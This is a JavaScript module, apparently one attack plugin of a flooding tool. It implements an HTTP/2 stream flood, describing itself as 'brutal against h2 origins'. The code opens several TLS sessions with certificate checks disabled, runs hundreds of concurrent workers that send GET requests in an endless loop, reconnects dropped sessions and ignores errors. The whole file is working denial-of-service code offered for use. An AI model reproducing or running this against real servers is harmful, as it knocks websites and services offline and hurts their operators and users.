'use strict';
const http2 = require('http2');

module.exports = {
  name: 'HTTP2',
  layer: 7,
  summary: 'Multiplexed HTTP/2 stream flood over a few TLS sessions. Brutal against h2 origins.',
  defaults: { concurrency: 400, sessions: 4 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const authority = `${target.scheme}://${target.hostHeader}`;
    const sessions = [];
    const wanted = Math.max(1, Math.min(Number(opts.sessions) || 4, 32));

    const connect = () => {
      const s = http2.connect(authority, { rejectUnauthorized: false });
      s.on('error', () => {});
      sessions.push(s);
      return s;
    };
    for (let i = 0; i < wanted; i++) connect();

    return {
      async worker(i) {
        while (ctx.running) {
          let session = sessions[i % wanted];
          if (!session || session.destroyed || session.closed) {
            session = connect();
            sessions[i % wanted] = session;
          }
          await new Promise((resolve) => {
            let settled = false;
            const done = (err, bytes) => {
              if (settled) return;
              settled = true;
              if (err) stats.err(); else stats.hit(bytes || 0);
              resolve();
            };
            let req;
            try {
              req = session.request({
                ':method': 'GET',
                ':path': target.path,
                'accept-encoding': 'identity',
              });
            } catch (e) { return done(new Error('stream')); }

            let bytes = 0;
            req.on('data', (c) => { bytes += c.length; });
            req.on('end', () => done(null, bytes));
            req.on('error', () => done(new Error('stream-error'), bytes));
            req.setTimeout(Number(opts.socketTimeout) || 10000, () => {
              try { req.close(); } catch {}
              done(new Error('h2-timeout'));
            });
            req.end();
          });
        }
      },
      destroy() { for (const s of sessions) { try { s.destroy(); } catch {} } },
    };
  },
};
